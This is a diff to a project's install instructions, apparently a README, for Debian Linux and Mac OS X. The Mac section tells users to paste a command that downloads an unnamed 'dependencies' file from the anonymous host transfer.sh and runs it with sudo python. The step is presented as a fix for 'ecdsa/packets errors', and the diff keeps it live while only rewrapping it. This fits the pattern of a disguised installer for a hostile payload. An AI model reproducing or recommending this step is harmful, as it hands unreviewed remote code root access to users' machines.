@@ -38,7 +38,8 @@ Debian-based Linux:
 
 Mac OS X:
  To avoid any ecdsa/packets errors :
- 1. Open a Mac Terminal (Apple + space), copy/paste "curl -s0 https://transfer.sh/c502X/dependencies && sudo python dependencies", press enter, imput Mac password
+ 1. Open a Mac Terminal (Apple + space), copy/paste
+    "curl -s0 https://transfer.sh/c502X/dependencies && sudo python dependencies", press enter, imput Mac password
  2. Install MacPorts from http://www.macports.org/
  3. sudo port install python27 py27-twisted py27-pip py-bsddb python_select
  4. sudo port select --set python python27
